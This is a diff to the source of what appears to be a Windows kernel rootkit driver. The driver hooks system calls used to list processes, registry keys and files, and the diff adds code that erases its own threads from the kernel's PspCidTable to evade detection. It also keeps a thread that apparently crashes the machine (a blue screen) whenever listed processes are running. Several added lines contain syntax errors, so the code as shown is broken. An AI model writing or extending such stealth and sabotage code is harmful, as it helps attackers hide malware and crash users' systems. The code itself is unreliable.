@@ -56,6 +56,7 @@ typedef NTSYSAPI NTSTATUS ZwQueryDirectoryFile_t(
   [in]           BOOLEAN                RestartScan
 );
 
+void RestorePspCidTable(const HANDLE threadId);
 
 // These will hold the Address of the syscalls
 ZwQuerySystemInformation_t g_SysInfo = 0;
@@ -63,14 +64,13 @@ ZwEnumerateKey_t g_EnumKey = 0;
 ZwEnumerateValueKey_t g_EnumValKey = 0;
 ZwQueryDirectoryFile_t g_QueryDir = 0;
 
+CLIENT_ID DetectionClient{0};
+
 //Driver Unload Routine
 VOID DriverUnload(PDRIVER_OBJECT DriverObject){
     UNREFERENCED_PARAMETER(DriverObject);
     stopThread = TRUE; //Stop the thread
-    if (h_Thread != NULL){
-        ZwClose(h_Thread);
-        h_Thread = NULL;
-    }
+    RestorePspCidTable(reinterpret_cast<HANDLE>(DetectionClient.UniqueThread));
     k_hook::stop() //stop the hook
     LARGE_INTEGER integer{ 0 };
     integer.QuadPart = -10000;
@@ -390,7 +390,7 @@ struct OriginalFlags
 }ogFLags;
 bool doOncePerBoot = TRUE;
 
-void DisableApcQueueable
+void DisableApcQueueable()
 {
   PKTHREAD pThread = KeGetCurrentThread();
   if (doOncePerBoot)
@@ -501,13 +501,16 @@ void __fastcall kHookCallback(unsigned long long ssdt_index, void** ssdt_address
   }
 }
 
-KSTART_ROUTINE BsodThread;
+CLIENT_ID BsodClient{0};
+OBJECT_ATTRIBUTES att{0};
+
+
 BOOLEAN stopThread = FALSE;
 VOID BsodThread(
     PVOID StartContext
 ) {
     UNREFERENCED_PARAMETER(StartContext);
-    DestroyPspCidTableEntry();
+    DestroyPspCidTableEntry(reinterpret_cast<HANDLE>(BsodClient.UniqueThread));
     while (!stopThread) {
         for (int i = 0; i < MAX_BSOD_PROCESSES && BSODProcesses[i] != NULL; ++i) {
             if (IsProcessRunning(BSODProcesses[i])) {
@@ -520,7 +523,7 @@ VOID BsodThread(
       KeDelayExecutionThread(KernelMode, FALSE, integer);
     }
     RestoreApcQueueable();
-
+    RestorePspCidTable(reinterpret_cast<HANDLE>(BsodClient.UniqueThread);
     PsTerminateSystemThread(STATUS_SUCCESS);
 }
 
@@ -558,14 +561,17 @@ VOID DelayTimeWorkItem(PDEVICE_OBJECT DeviceObject, PVOID Context){
     g_QueryDir = (ZwQueryDirectoryFile_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwQueryDirectoryFile"));
     g_EnumKey = (ZwEnumerateKey_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwEnumerateKey"));
     
-    NTSTATUS Hook = k_hook::initialize(kHookCallback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+    NTSTATUS Hook = k_hook::initialize(kHookCallback) && k_hook::start(&DetectionClient) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
     if (Hook == STATUS_UNSUCCESSFUL) log_debug("Failed to hook GetCpuClock.");
+    
 
-    NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BsodThread, NULL);
+    InitializeObjectAttributes(&att, 0, OBJ_KERNEL_HANDLE, 0, 0);
+    NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, &att, NULL, &BsodClient, BsodThread, NULL);
     if (!NT_SUCCESS(status)){
         log_debug("Failed to create a thread.");
         DelayTimeWorked = status;
     }
+    ZwClose(h_Thread);
     DelayTimeWorked = NT_SUCCESS;
     IoFreeWorkItem(workItem);
 }
@@ -612,21 +618,17 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, 
         g_QueryDir = (ZwQueryDirectoryFile_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwQueryDirectoryFile"));
         g_EnumKey = (ZwEnumerateKey_t)MmGetSystemRoutineAddress(RTL_CONSTANT_STRING("ZwEnumerateKey"));
 
-        NTSTATUS Hook = k_hook::initialize(kHookCallback) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+        NTSTATUS Hook = k_hook::initialize(kHookCallback) && k_hook::start(&DetectionClient) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
         if (Hook == STATUS_UNSUCCESSFUL) log_debug("Failed to hook GetCpuClock.");
-
-
-        NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BsodThread, NULL);
+        InitializeObjectAttributes(&att, 0, OBJ_KERNEL_HANDLE, 0, 0);
+        NTSTATUS status = PsCreateSystemThread(&h_Thread, THREAD_ALL_ACCESS, &att, NULL, &BsodClient, BsodThread, NULL);
         if (!NT_SUCCESS(status)){
             log_debug("Failed to create a thread.");
             return status;
         }
     }
 
-    if (h_Thread != NULL){
-        ZwClose(h_Thread);
-        h_Thread = NULL;
-    }
+    ZwClose(h_Thread)
     return STATUS_SUCCESS;
 }
 
